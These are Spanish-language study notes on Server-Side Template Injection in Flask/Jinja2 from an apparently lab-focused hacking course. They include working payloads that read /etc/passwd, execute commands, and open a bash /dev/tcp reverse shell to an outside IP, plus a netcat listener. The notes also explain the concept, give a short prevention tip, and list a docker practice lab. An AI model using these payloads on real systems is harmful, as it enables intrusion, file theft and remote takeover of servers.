---
tags:
  - Web
  - Explotacion
  - "#SSTI"
---

# Notas

Para resumirlo rápidamente, SSTI es una vulnerabilidad que aprovecha una implementación insegura de un motor de plantillas (template engine). Los motores de plantilla son empleado por las aplicaciones web para la presentación de datos dinámicos.
Por lo general, a menudo muchas inserciones de los usuarios que son posteriormente reflejadas en la respuesta de la aplicación web son interpretadas como vulnerabilidades de Cross-Site Scripting (XSS), sin embargo a través del aprovechamiento de esta vulnerabilidad es posible atacar directamente a los componentes internos del servidor web del objetivo.
Algunos motores de plantilla populares son los siguientes:

- **PHP**: Smarty, Twig
- **Java**: Velocity, FreeMarker
- **Python**: Jinja, Mako, Tornado
- **JavaScript**: Jade, Rage
- **Ruby**: Liquid


## Python Flask

Siempre que veamos una página web que por debajo este funcionando en python y/o flask podemos realizar lo siguiente:

Comprobar que trabaja por detrás:  **TAMBIEN SE USA WAPPALYZER**

```bash
whatweb 127.0.0.1:80

# RESULTADO
http://127.0.0.1:8089 [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.2.2 Python/3.9.13], IP[127.0.0.1], Python[3.9.13], Title[SSTI demo app], Werkzeug[2.2.2]
```

Dentro de un formulario introducciones lo siguiente:
```
{{7*7}}
```
Si vemos en la respuesta vemos el resultado de la operación, esto quiere decir que es vulnerable.

También podemos hacer las siguientes consultas:  (MUESTRA 7 VECES 7)
```
{{'7'*7}}
```

**CON ESTO PODEMOS EJECUTAR CODIGO MALICIOSO**

Podemos ir a la página https://github.com/swisskyrepo/PayloadsAllTheThings
Aquí buscamos la vulnerabilidad y vemos que tenemos payloads para usar.

**LEER ARCHIVOS**

```python
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

**Para ejecutar comandos:**

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```


**Para enviarnos una reverse shell**

```bash
sudo nc -nlvp 433
```

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >%26 /dev/tcp/192.168.1.149/433 0>%261"').read() }}
```
# Hack4u

El **Server-Side Template Injection** (**SSTI**) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una **plantilla** de servidor.

Las plantillas de servidor son archivos que contienen código que se utiliza para generar **contenido dinámico** en una aplicación web. Los atacantes pueden aprovechar una vulnerabilidad de SSTI para inyectar código malicioso en una plantilla de servidor, lo que les permite ejecutar comandos en el servidor y obtener acceso no autorizado tanto a la aplicación web como a posibles datos sensibles.

Por ejemplo, imagina que una aplicación web utiliza plantillas de servidor para generar correos electrónicos personalizados. Un atacante podría aprovechar una vulnerabilidad de **SSTI** para inyectar código malicioso en la plantilla de correo electrónico, lo que permitiría al atacante ejecutar comandos en el servidor y obtener acceso no autorizado a los datos sensibles de la aplicación web.

En un caso práctico, los atacantes pueden detectar si una aplicación Flask está en uso, por ejemplo, utilizando herramientas como **WhatWeb**. Si un atacante detecta que una aplicación **Flask** está en uso, puede intentar explotar una vulnerabilidad de **SSTI**, ya que Flask utiliza el motor de plantillas **Jinja2**, que es vulnerable a este tipo de ataque.

Para los atacantes, detectar una aplicación Flask o Python puede ser un primer paso en el proceso de intentar explotar una vulnerabilidad de SSTI. Sin embargo, los atacantes también pueden intentar identificar vulnerabilidades de SSTI en otras aplicaciones web que utilicen diferentes frameworks de plantillas, como Django, Ruby on Rails, entre otros.

Para prevenir los ataques de SSTI, los desarrolladores de aplicaciones web deben validar y filtrar adecuadamente la entrada del usuario y utilizar herramientas y frameworks de plantillas seguros que implementen medidas de seguridad para prevenir la inyección de código malicioso.

# Laboratorio

## Lab 1

```bash
docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playground
```